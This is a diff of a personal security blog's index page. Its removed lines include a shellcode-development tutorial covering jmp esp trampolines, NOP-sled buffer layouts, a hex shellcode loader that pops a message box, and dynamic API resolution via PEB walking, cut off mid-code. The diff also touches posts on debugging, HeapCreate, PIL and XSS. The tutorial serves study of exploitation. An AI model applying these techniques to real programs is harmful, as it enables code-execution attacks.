@@ -331,7 +331,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/24/re/VC6-0进行软件断点调试/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/code/Python的图片处理库PIL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -350,7 +350,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/06/24/re/VC6-0进行软件断点调试/" itemprop="url">VC6.0进行软件断点调试</a></h2>
+                <a class="post-title-link" href="/2017/09/21/code/Python的图片处理库PIL/" itemprop="url">Python的图片处理库PIL</a></h2>
         
 
         <div class="post-meta">
@@ -362,8 +362,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-24T10:42:36+08:00">
-                2017-06-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T21:02:35+08:00">
+                2017-09-21
               </time>
             
 
@@ -385,8 +385,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/re/" itemprop="url" rel="index">
-                    <span itemprop="name">re</span>
+                  <a href="/categories/code/" itemprop="url" rel="index">
+                    <span itemprop="name">code</span>
                   </a>
                 </span>
 
@@ -424,67 +424,18 @@
       
         
           
-            <h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><font color="#f00">VC6.0进行断点调试的时候，系统经常会提示应用程序错误，然后调试过程直接结束。所以我们急需解决vc6.0软件断点调试的解决办法。<br><br>VC中的Just-in-time调试,使用该调试模式应用程序可以在Visual C++开发环境之外运行知道发生一个错误.当遇到一个程序错误时,Just-in-time调试自动加载Visual C++ Debugger。<br><br>打开Just-in-time调试：修改Tools-&gt;Options-&gt;Debugging，选中Just-in-time debugging选项即可。(其实该选项所做的操作就是写了个注册表,将自己作为其他程序抛出异常时的处理程序,下面有介绍)<br></font>
-
-<p>设置即时调试断点，在编译生成的Debug版本程序中加入断点异常，在代码中硬编码一个断点(相当于让程序出错)，让程序在到达程序员希望停止位置时加载已经打开源码的Debugger实现对该位置的调试。(当然没有源码也可以调试的，如果想调试汇编的话.)</p>
-<ul>
-<li><p>VC中的即时调试断点设置方法:DbgBreakPoint 或者 DebugBreak</p>
-</li>
-<li><p>C#中的即时调试断点设置方法:Debugger.Break</p>
-</li>
-<li><p>js中的即时调试断点设置方法:Debugger</p>
-</li>
-<li><p>ASP(VBS)中的即时调试断点设置方法:Stop</p>
-</li>
-</ul>
-<p>###VC6.0调试 断点中断程序的执行(断点指令)</p>
-<h4 id="断点指令"><a href="#断点指令" class="headerlink" title="断点指令"></a>断点指令</h4><p>那么我们就来说说什么是断点，断点是什么？不是F9 ，也不是那个小红球，在Intel系列的CPU（包括AMD生产的CPU）里面，它其实是一个特殊的指令：INT 3。CPU在执行程序的指令集的时候，只要碰到这个指令，就会中断程序的执行。</p>
-<h5 id="引用的示例"><a href="#引用的示例" class="headerlink" title="引用的示例"></a>引用的示例</h5><p>当然我们需要用事实来证明我上面的话，因此把下面的程序编译并且执行一下，点“Yes”，点“Break”，程序就中断了.<br>以下为引用内容：</p>
-<pre><code>#include &lt;stdio.h&gt;
-void main()
-{
-   printf(&quot;Before breakpoint&quot;n&quot;);
-   __asm
-   {
-     int 3
-   }
-   printf(&quot;Before breakpoint&quot;n&quot;);
-}
-</code></pre><p>断点是int 3这个指令触发的。</p>
-<p>由int 3这个指令（当然是在intel系列的CPU上面）引申出来的函数 ：</p>
-<table>
-<thead>
-<tr>
-<th>语言/工具</th>
-<th>名称</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>C++</td>
-<td>DebugBreak</td>
-<td>在C++代码中硬编码一个断点。</td>
-</tr>
-<tr>
-<td>C#</td>
-<td>Debugger.Break</td>
-<td>在.NET代码中硬编码一个断点</td>
-</tr>
-<tr>
-<td>Visual Studio</td>
-<td>断点</td>
-<td>设置一个断点</td>
-</tr>
-</tbody>
-</table>
-<h3 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h3><p>随时将调试程序连接到任何进程的能力称为即时调试（Just-in-timeDebugging）。</p>
-<p>这里我们对它如何工作稍加说明：当程序员点击Cancel按钮，就是告诉UnhandledExceptionFilter函数对进程进行调试。在内部，UnhandledExceptionFilter调用调试程序，这需要查看下面的注册表子关键字：</p>
-<p><font color="#0f0">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/AeDebug<br>在这个子关键字里，有一个名为Debugger的数值，在安装VisualStudio时被设置成下面的值：<br>&quot;C:/Program Files/Microsoft Visual Studio/Common/MSDev98/Bin/msdev.exe&quot; -p %ld -e %ld<br></font><br>在Windows98中，这些值不是存放在注册表中，而是存放在Win.ini文件中。<br>这一行代码是告诉系统要将哪一个程序（这里是MSDev.exe）作为调试程序运行。当然也可以选择其他调试程序。 UnhandledExceptionFilter还在这个命令行中向调试程序传递两个参数。第一个参数是被调试进程的ID。第二个参数规定一个可继承的 手工复位事件，这个事件是由UnhandledExceptionFilter按无信号状态建立的。厂商必须实现他们的调试程序，这样才能认识指定进程 ID和事件句柄的-p和-e选项。<br>在进程ID和事件句柄都合并到这个串中之后，UnhandledExceptionFilter通过调用 CreateProcess来执行调试程序。这时，调试程序进程开始运行并检查它的命令行参数。如果存在-p选项，调试程序取得进程ID，并通过调用 DebugActiveProcess将自身挂接在该进程上。<br>BOOL DebugActiveProcess(DWORD dwProcessID);<br>一旦调试程序完成自身的挂接，操作系统将被调试者（debuggee）的状态通报给调试程序。<br>在调试程序完全初始化之后，它要再检查它的命令行，找-e选项。如果该选项存在，调试程序取得相应的事件句柄并调用SetEvent。调试程序可以直接使用事件的句柄值，因为事件句柄具有创建的可继承性，并且被调试进程对UnhandledExceptionFilter函数的调用也使调试程序进程成为一个子进程。</p>
-<p>设定这个事件将唤醒被调试进程的线程。被唤醒的线程将有关未处理异常的信息传递给调试程序。调试程序接收这些通知并加载相应的源代码文件，再将自身放在引发异常的指令位置上。<br>还有，不必在调试进程之前等待异常的出现。可以随时将一个调试程序连接在任何进程上，只需运行“MSDEV-pPID”，其中PID是要调试的进程的ID。 实际上，利用Windows2000 TaskManager，做这些事很容易。当观察Process标记栏时，可以选择一个进程，点击鼠标右键，并选择Debug菜单选项。这将引起 TaskManager去查看前面讨论过的注册表子关键字，调用CreateProcess，并传递所选定的进程的ID作为参数。在这里，TaskManager为事件句柄传送0值。</p>
-<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>本文转自<a href="http://blog.csdn.net/dongzhiquan/article/details/4568389" target="_blank" rel="external">即时调试（Just-in-timeDebugging） Visual Studio调试 断点中断程序的执行(断点指令)</a></p>
+          PIL 是Python Image Library的缩写，意思即为Python的图片处理库
+PIL的官方文档是http://effbot.org/imagingbook/pil-index.htm
+内容很全，也不需赘述
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/21/code/Python的图片处理库PIL/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -531,7 +482,7 @@ void main()
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/23/0day/HeapCreate/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/web/xss-bot介绍/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -550,7 +501,7 @@ void main()
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/06/23/0day/HeapCreate/" itemprop="url">HeapCreate()</a></h2>
+                <a class="post-title-link" href="/2017/09/21/web/xss-bot介绍/" itemprop="url">xss bot介绍</a></h2>
         
 
         <div class="post-meta">
@@ -562,8 +513,8 @@ void main()
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-23T13:23:37+08:00">
-                2017-06-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T17:22:02+08:00">
+                2017-09-21
               </time>
             
 
@@ -585,8 +536,8 @@ void main()
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
                   </a>
                 </span>
 
@@ -624,52 +575,17 @@ void main()
       
         
           
-            <p>HeapCreate<br>这个函数创建一个只有调用进程才能访问的私有堆。进程从虚拟地址空间里保留出一个连续的块并且为这个块特定的初始部分分配物理空间。</p>
-<p>HANDLE HeapCreate(DWORD flOptions , DWORD dwInitialSize , DWORD dwMaxmumSize);</p>
-<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>flOptions：堆的可选属性。这些标记影响以后对这个堆的函数操作，函数有：HeapAlloc , HeapFree , HeapReAlloc , HeapSize .<br>下面给_出在此可以指定的标记：<br>HEAP_NO_SERIALIAZE：指定当函数从堆里分配和释放空间时不互斥（不使用互斥锁）。当不指定该标记时默认为使用互斥。序列化允许多个线程操作同一个堆而不会错误。这个标记是可忽略的。<br>HEAP_SHARED_READONLY：这个标记指定这个堆只能由创建它的进程进行写操作，对其他进程是只读的。如果调用者不是可靠的，调用将会失败，错误代码ERROR_ACCESS_DENIDE 。<br>注解：为了使用标记为HEAP_SHARED_READONLY的堆，运行在kernel mode（核心状态）是必须的。</p>
-<p>dwInitialSize：堆的初始大小，单位为Bytes。这个值决定了分配给堆的初始物理空间大小。这个值将向上舍入知道下个page boundary（页界）。若需得到主机的页大小，使用GetSystemInfo 函数。</p>
-<p>dwMaxmumSize：如果该参数是一个非零的值，它指定了这个堆的最大大小，单位为Bytes。该函数会向上舍入该值直到下个页界，然后为这个堆在进程的虚拟地址里保留舍入后大小的块。如果函数 HeapAlloc 和 HeapReAlloc 要求分配的空间超过参数 dwInitialSize 指定的大小，系统会分配额外的空间给该堆直到这个堆的最大大小。If dwMaximumSize is nonzero, the heap cannot grow and an absolute limitation arises where all allocations are fulfilled within the specified heap unless there is not enough free space. （如果该参数非零，除非没有足够的空间，这个堆总可以增长到该大小）。如果该参数为零，那么该堆大小的唯一限制是可用的内存空间。分配大小超过 0x0018000 Bytes的空间总会失败，因为获得这么大的空间需要系统调用 VirtualAlloc 函数。需要使用大空间的应用应该把该参数设置为零。</p>
-<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>成功：一个指向新创建的堆的指针。<br>失败：NULL<br>调用函数 GetLastError 获得更多的错误信息。</p>
-<h4>附注</h4>
-
-<p>这个函数在调用进程里创建一个私有堆，进程可调用 HeapAlloc 函数分配内存空间。这些页在进程的虚拟空间内创建了一个块，在那里堆可以增长。<br>如果 HeapAlloc 函数请求的空间超过了现有的页大小，如果物理空间足够的话，额外的空间将会从已保留的空间里附加。<br>只有创建私有堆的进程可以访问私有堆。<br>如果一个DLL（动态链接库）创建了一个私有堆，那么这么私有堆是在调用该DLL的进程的地址空间内，且仅该进程可访问。<br>系统会使用私有堆的一部分空间去储存堆的结构信息，所以，不是所有的堆内空间对进程来说是可用的。例如：HeapAlloc函数从一个最大大小为 64KB 的堆里申请 64KB 的空间，由于系统占用的一部分空间，这个请求通常会失败。</p>
-<h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Minimum supported client</td>
-<td>Windows XP [desktop apps or Windows Store apps]</td>
-</tr>
-<tr>
-<td>Minimum supported server</td>
-<td>Windows Server 2003 [desktop apps or Windows Store apps]</td>
-</tr>
-<tr>
-<td>Minimum supported phone</td>
-<td>Windows Phone 8</td>
-</tr>
-<tr>
-<td>Header</td>
-<td>HeapApi.h (include Windows.h);<br>WinBase.h on Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003 and Windows XP (include Windows.h)</td>
-</tr>
-<tr>
-<td>Library</td>
-<td>Kernel32.lib</td>
-</tr>
-<tr>
-<td>DLL</td>
-<td>Kernel32.dll</td>
-</tr>
-</tbody>
-</table>
-<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366597.aspx" target="_blank" rel="external">HeapCreate in MSDN</a><br><a href="http://blog.csdn.net/windroid/article/details/42302519" target="_blank" rel="external">HeapCreate()</a></p>
-
-          
+          这篇文章摘抄与LoRexxar的的博客https://lorexxar.cn/2017/05/12/xss-bot2/
+bot是什么？原意是robot的意思，也指一个在没有人工干预下在因特网上搜索信息的程序。这里的xss bot指的是：将攻击者提供的攻击代码在服务器上模拟执行的程序。
+因此xss b
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/21/web/xss-bot介绍/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -716,7 +632,7 @@ void main()
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/0day/开发shellcode/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/web/xss简介/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -735,7 +651,7 @@ void main()
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/06/22/0day/开发shellcode/" itemprop="url">开发shellcode</a></h2>
+                <a class="post-title-link" href="/2017/09/21/web/xss简介/" itemprop="url">xss简介</a></h2>
         
 
         <div class="post-meta">
@@ -747,8 +663,8 @@ void main()
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T23:14:11+08:00">
-                2017-06-22
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T16:24:13+08:00">
+                2017-09-21
               </time>
             
 
@@ -770,8 +686,8 @@ void main()
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
                   </a>
                 </span>
 
@@ -809,405 +725,17 @@ void main()
       
         
           
-            <p>其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！</p>
-<h3 id="1-shellcode概述"><a href="#1-shellcode概述" class="headerlink" title="1. shellcode概述"></a>1. shellcode概述</h3><h4 id="1-1-shellcode和exploit"><a href="#1-1-shellcode和exploit" class="headerlink" title="1.1 shellcode和exploit"></a>1.1 shellcode和exploit</h4><p>shellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。</p>
-<p>exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性输入，exploit的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode，与shellcode具有一定的通用性不同，exploit往往只是针对特定漏洞而言的。</p>
-<p>Metasploit通过规范化exploit和shellcode之间的接口把漏洞利用的过程封装成易用的模块，大大减少了exploit开发过程中的重复工作，深刻体现了代码重用和模块化、结构化的思想:<br>（1）所有的 exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令地址等关键信息。<br>（2）将常用的shellcode（例如，用于绑定端口反向链接、执行任意命令等）封装成一个个通用的模块，可以轻易地域任意漏洞的exploit进行结合。</p>
-<h4 id="1-2-shellcode需要解决的问题"><a href="#1-2-shellcode需要解决的问题" class="headerlink" title="1.2 shellcode需要解决的问题"></a>1.2 shellcode需要解决的问题</h4><p><b>由于运行在某个动态链接苦衷的函数在程序运行的过程中被动态加载，这时的栈会动态变化，也即调试器中抄出来的shellcode起始地址下次改变了。所以要编写出通用的shellcode，就需要找到一种途径让程序能够自动定位到shellcode的起始地址。</b></p>
-<h3 id="2-定位shellcode"><a href="#2-定位shellcode" class="headerlink" title="2. 定位shellcode"></a>2. 定位shellcode</h3><h4 id="2-1-栈帧移位与jmp-esp"><a href="#2-1-栈帧移位与jmp-esp" class="headerlink" title="2.1 栈帧移位与jmp esp"></a>2.1 栈帧移位与jmp esp</h4><p>动态定位的方法：<br>（1）用内存中任意一个jmp esp指令的地址覆盖函数返回地址，而不是原来手工查出的shellcode起始地址直接覆盖。<br>（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。<br>（3）由于esp在函数返回时仍指向栈区（函数返回地址之后），jmp esp指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。<br>（4）重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把shellcode恰好放在函数返回地址之后，这样jmp esp指令执行过后恰好跳进shellcode。</p>
-<p><img src="/images/2017-06-22/shellcode.png" alt="使用“跳板”的溢出利用流程"></p>
-<h4 id="2-2-获取跳板地址"><a href="#2-2-获取跳板地址" class="headerlink" title="2.2 获取跳板地址"></a>2.2 获取跳板地址</h4><font color="#f00">最简单，最实用的是使用msfpescan获取jmp esp的地址，而且速度更快！！！</font>
-
-<p>具体指令是: msfpescan -f -j esp PE文件</p>
-<p>书中给出了另一种方法：</p>
-<p>获取user32.dll内跳转指令地址最直观的方法就是编程搜索内存。其他程序也是如此！</p>
-<p>另一种办法就是使用OllyDbg中的搜索命令指令，对程序命令进行搜索，最终可以找到！搜 JMP ESP 或者 CALL ESP</p>
-<p>获取JMP ESP的代码</p>
-<pre><code>#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-define DLL_NAME &quot;user32.dll&quot;
-
-void main()
-{
-    BYTE *ptr;
-    int position, address;
-    HINSTANCE handle;
-    BOOL done_flag = FALSE;
-    handle = LoadLibrary(DLL_NAME);
-    if (!handle)
-    {
-        printf(&quot;  load dll erro !&quot;);
-        exit(0);
-    }
-    ptr = (BYTE*)handle;
-
-    for (position=0; !done_flag; position++)
-    {
-        try
-        {
-            //0xFFE4 is opcode of jmp esp
-            if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)
-            {
-                int address = (int)ptr + position;
-                printf(&quot;OPCODE(JMP ESP) found at 0x%x\n&quot;, address);
-                done_flag = TRUE;
-            }
-        }
-        catch(...)
-        {
-            int address = (int)ptr + position;
-            printf(&quot;END OF 0x%x\n&quot;, address);
-            //done_flag = TRUE;
-        }
-    }
-}
-</code></pre><p>上面的方法很具有局限性，因为将jmp esp重新更换为jmp eax时，上述代码就不可用，需要查询相应的opcode</p>
-<h4 id="2-3-测试shellcode的可执行性"><a href="#2-3-测试shellcode的可执行性" class="headerlink" title="2.3 测试shellcode的可执行性"></a>2.3 测试shellcode的可执行性</h4><p>我们可以在vc6.0中编译相应的汇编代码，最好能够正常执行，能够执行了之后，通过OllyDbg获得相应的代码块，导出即可获得完整的代码。</p>
-<pre><code>
-#include &lt;windows.h&gt;
-
-void main()
-{
-    HINSTANCE LibHandle;
-    char dllbuf[11] = "user32.dll";
-    LibHandle = LoadLibrary(dllbuf);
-    _asm{
-        sub sp,0x440
-        xor ebx,ebx
-        push ebx //cut string
-        push 0x74736577
-        push 0x6C696166 //push failwest
-
-        mov eax,esp //load address of failwest
-        push ebx
-        push eax
-        push eax
-        push ebx
-
-        mov eax, 0x77E16544    //address should be reset in different OS, this is Win 2000 server
-        call eax //call MessageboxA
-        push ebx
-        mov eax, 0x77E70E7D    //address of ExitProcess in Kernel32.dll
-        call eax //call exit(0)
-    }
-}
-</code></pre>
-
-<p>如果使用上述地址能够弹出默认窗口，那么代表上述所用的MessageBoxA和ExitProcess的地址都是正确的。</p>
-<h3 id="3-缓冲区的组织"><a href="#3-缓冲区的组织" class="headerlink" title="3. 缓冲区的组织"></a>3. 缓冲区的组织</h3><h4 id="3-1-缓冲区的组成"><a href="#3-1-缓冲区的组成" class="headerlink" title="3.1 缓冲区的组成"></a>3.1 缓冲区的组成</h4><p>如果选用jmp esp作为定位shellcode的跳板，那么在函数返回后要根据缓冲区大小，所需shellcode长短等实际情况灵活布置缓冲区。送入缓冲区的数据分以下几种：</p>
-<ol>
-<li>填充物：可以是任意值，但是一般用nop指令对应的0x90来填充缓冲区，并把shellcode布置于其后。这样即使不能准确跳转到shellcode的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。</li>
-<li>淹没返回地址的数据：可以是跳转指令的地址、shellcode的地址，甚至是一个近似shellcode的地址。</li>
-<li>shellcode：可执行的机器代码</li>
-</ol>
-<p>以下是几种缓冲区的组织方式：<br><img src="/images/2017-06-22/shellcode_method.png" alt="不同缓冲区组织方式"><br>当缓冲区较大时，倾向于将shellcode布置到缓冲区中。有以下几个好处：</p>
-<ol>
-<li>合理利用缓冲区，使攻击串的总长度减小；对于远程攻击，有时所有数据必须包含在一个数据包中！</li>
-<li>对程序破坏小，比较稳定；溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。</li>
-</ol>
-<h4 id="3-2-抬高栈顶保护shellcode"><a href="#3-2-抬高栈顶保护shellcode" class="headerlink" title="3.2 抬高栈顶保护shellcode"></a>3.2 抬高栈顶保护shellcode</h4><p>把shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变ESP寄存器中的值，逻辑上，ESP以上的内存空间的数据已经作废；物理上，这些数据并没有被销毁。如果shellcode中没有压栈指令向栈中写入数据还没有太大影响；但如果使用push指令在栈中暂存数据，压栈数据很可能会破坏shellcode自身。</p>
-<p>当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向），这时shellcode离栈顶较远 ，几次压栈可能只会破坏到一些填充nop；但是，如果缓冲区已经被shellcode占满，则shellcode离栈顶比较近，这时的情况就必要危险。</p>
-<p>为此，为了提高较强的通用性，通常会在shellcode中一开始就大范围抬高栈顶，把shellcode藏在栈内。</p>
-<h4 id="3-3-使用其他跳转指令"><a href="#3-3-使用其他跳转指令" class="headerlink" title="3.3 使用其他跳转指令"></a>3.3 使用其他跳转指令</h4><p>使用jmp esp做“跳板”的方法是最简单，也是最常用的定位shellcode的方法。在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。往往除了ESP之外，EAX、EBX、ESI等寄存器也会指向栈顶附近，故在选择跳转指令地址时也可以灵活一些，除了jmp esp之外，mov eax、esp和jmp eax等指令序列也可以完成进入栈区的功能。</p>
-<p><b><center>常用跳转指令与机器码的对应关系</center></b></p>
-<table>
-<thead>
-<tr>
-<th>机器码（十六进制）</th>
-<th>对应的跳转指令</th>
-<th>机器码（十六进制）</th>
-<th>对应的跳转指令</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>FF EO</td>
-<td>JMP EAX</td>
-<td>FF D0</td>
-<td>CALL EAX</td>
-</tr>
-<tr>
-<td>FF E1</td>
-<td>JMP ECX</td>
-<td>FF D1</td>
-<td>CALL ECX</td>
-</tr>
-<tr>
-<td>FF E2</td>
-<td>JMP EDX</td>
-<td>FF D2</td>
-<td>CALL EDX</td>
-</tr>
-<tr>
-<td>FF E3</td>
-<td>JMP EBX</td>
-<td>FF D3</td>
-<td>CALL EBX</td>
-</tr>
-<tr>
-<td>FF E4</td>
-<td>JMP ESP</td>
-<td>FF D4</td>
-<td>CALL ESP</td>
-</tr>
-<tr>
-<td>FF E5</td>
-<td>JMP EBP</td>
-<td>FF D5</td>
-<td>CALL EBP</td>
-</tr>
-<tr>
-<td>FF E6</td>
-<td>JMP ESI</td>
-<td>FF D6</td>
-<td>CALL ESI</td>
-</tr>
-<tr>
-<td>FF E7</td>
-<td>JMP EDI</td>
-<td>FF D7</td>
-<td>CALL EDI</td>
-</tr>
-</tbody>
-</table>
-<h4 id="3-4-不使用跳转指令"><a href="#3-4-不使用跳转指令" class="headerlink" title="3.4 不使用跳转指令"></a>3.4 不使用跳转指令</h4><p>个别苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位shellcode，而使用shellcode的静态地址来覆盖又不够准确，这时我们可以做一个折中，如果过能够淹没大片的内存区域，可以将shellcode布置在一大段nop之后。这时定位shellcode时，只要能跳进这一大片nop中，shellcode就可以得到执行。</p>
-<h4 id="3-5-函数返回地址移位"><a href="#3-5-函数返回地址移位" class="headerlink" title="3.5 函数返回地址移位"></a>3.5 函数返回地址移位</h4><p>一些情况下，返回地址距离缓冲区的偏移量是不确定的，这时我们也可以采取前面介绍过的方法来提高exploit的成功率。</p>
-<p>如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令来覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode就能得以执行。</p>
-<p><img src="/images/2017-06-22/shellcode2.png" alt="shellcode"></p>
-<font color="#f00">函数返回地址距离我们输入的字符串的偏移在不同的计算机上就可能出现按照字节错位</font>
-
-<p><img src="/images/2017-06-22/shellcode_shift.png" alt="shellcode移位"></p>
-<h3 id="4-开发通用的shellcode"><a href="#4-开发通用的shellcode" class="headerlink" title="4. 开发通用的shellcode"></a>4. 开发通用的shellcode</h3><h4 id="4-1-定位API的原理"><a href="#4-1-定位API的原理" class="headerlink" title="4.1 定位API的原理"></a>4.1 定位API的原理</h4><p>所有win32程序都会加载ntdll.dll和kernel32.dll这两个最基础的动态链接库。如果想要在win32平台上定位kernel32.dll中的API地址，可采用如下方法：<br>（1）首先通过段选择字FS在内存中找到当前的线程环境块TEB<br>（2）线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针<br>（3）进程环境块中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针。其中，存放着已经被进程装载的动态链接库的信息。<br>（4）PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针InInitializationOrderModuleList<br>（5）模块初始化链表InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点为kernel32.dll<br>（6）找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址<br>（7）从kernel32.dll的加载基址算起，偏移0x3C的地方就是PE头<br>（8）PE头偏移0x78的地方存放着指向函数导出表的指针<br>（9）至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。</p>
-<ul>
-<li>导出表偏移0x1C处的指针指向存储导出函数偏移地址(RVA)的列表</li>
-<li>导出表偏移0x20处的指针指向存储导出函数函数名的列表</li>
-<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需函数是第几个，然后在地址列表汇总找到对应的RVA</li>
-<li>获得RVA后，再加上前边已经得到的动态链接库的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode中调用时需要的地址。</li>
-</ul>
-<p><img src="/images/2017-06-22/shellcode_api.jpg" alt="在shellcode中动态定位API的原理"></p>
-<font color="#f00">需要说明的是：上述图中所表现的ntdll.dll过了之后就是kernel32.dll并不完全正确，准确的说这只在window xp及其以前是这样的；但是从win7开始，这两者之间加入了kernelbase.dll</font>
-
-<h4 id="4-2-shellcode的加载与测试"><a href="#4-2-shellcode的加载与测试" class="headerlink" title="4.2 shellcode的加载与测试"></a>4.2 shellcode的加载与测试</h4><p>这一章类似于2.3节的内容，但是有些许的改变，可以与其对照进行查看.</p>
-<pre><code>
-#include &lt;windows.h&gt;
-
-char shellcode[] =
-"\x66\x81\xEC\x40\x04"        // SUB SP, 440
-"\x33\xDB"                    // XOR EBX, EBX
-"\x53"                        // PUSH EBX
-"\x68\x77\x65\x73\x74"        // PUSH 74736577
-"\x68\x66\x61\x69\x6C"        // PUSH 6C696166
-"\x8B\xC4"                    // MOV EAX, ESP
-"\x53"                        // PUSH EBX
-"\x50"                        // PUSH EAX
-"\x50"                        // PUSH EAX
-"\x53"                        // PUSH EBX
-"\xB8\x44\x65\xE1\x77"        // MOV EAX, user32.MessageBoxA
-"\xFF\xD0"                    // CALL EAX
-"\x53"                        // PUSH EBX
-"\xB8\x7D\x0E\xE7\x77"        // MOV EAX, kernel32.ExitProcess
-"\xFF\xD0";                    // CALL EAX
-
-void main()
-{
-    HINSTANCE LibHandle;
-    char dllbuf[11] = "user32.dll";
-    LibHandle = LoadLibrary(dllbuf);
-    __asm
-    {
-        lea eax, shellcode
-        push eax
-        ret
-    }
-}
-</code></pre>
-
-<h4 id="4-3-动态定位API地址的shellcode"><a href="#4-3-动态定位API地址的shellcode" class="headerlink" title="4.3 动态定位API地址的shellcode"></a>4.3 动态定位API地址的shellcode</h4><p>首先需要知道的是：<br>MessageBoxA： user32.dll<br>ExitProcess: kernel32.dll<br>LoadLibraryA: kernel32.dll</p>
-<p>由于shellcode最终是要放进缓冲区的，为了让shellcode更加通用，能被大多数缓冲区容纳，我们总是希望shellcode尽可能短。因此一般不会用“MessageBoxA”这么长的字符串进行直接比较。<br>通常会对所用的API函数进行hash运算，搜索导出表时对当前遇到的函数名同样进行hash。对比之后，判断是否是需要的API。</p>
-<pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;windows.h&gt;
-
-DWORD GetHash(char  *fun_name)
-{
-    DWORD digest=0;
-    while(*fun_name)
-    {
-        digest = ((digest<<25)|(digest>>7));    // 循环右移7位
-        digest += *fun_name;                    // 累加
-        fun_name++;
-    }
-    return digest;
-}
-
-void main()
-{
-    DWORD hash;
